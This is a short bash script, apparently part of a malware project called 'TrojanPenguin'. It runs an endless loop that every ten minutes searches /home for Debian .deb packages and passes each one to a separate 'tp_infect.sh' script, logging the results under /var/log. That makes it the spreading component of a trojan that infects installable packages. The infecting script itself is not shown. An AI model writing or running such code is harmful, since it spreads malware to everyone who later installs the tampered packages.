#!/bin/bash

#debug="/home/dima/Dropbox/Programming/projects/TrojanPenguin/TrojanPenguin"
debug=""

if ! [ -d $debug/var/log/trojan_penguin/ ]; then
	mkdir $debug/var/log/trojan_penguin
	echo "0" > $debug/var/log/trojan_penguin/log
fi


while [ 1 ]
do
	list=$(find /home -name "*.deb")
 	for line in $list
 	do
  		$debug/usr/bin/tp_infect.sh $line >> $debug/var/log/trojan_penguin/log
	done 
    date > $debug/var/log/trojan_penguin/last_start
    sleep 600
done
